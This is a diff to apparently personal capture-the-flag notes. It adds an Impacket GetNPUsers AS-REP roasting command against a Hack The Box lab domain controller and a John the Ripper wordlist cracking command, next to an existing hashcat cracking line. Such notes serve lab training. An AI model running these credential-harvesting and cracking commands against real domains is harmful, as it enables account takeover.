@@ -32,3 +32,11 @@ cat hash.txt
 $5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3
 hashcat -m 7400 hash.txt /usr/share/wordlists/rockyou.txt --force
 ```
+
+
+```
+ GetNPUsers.py -format john -no-pass -k -usersfile users -dc-ip 10.10.10.161 HTB.LOCAL/
+
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
+
+```
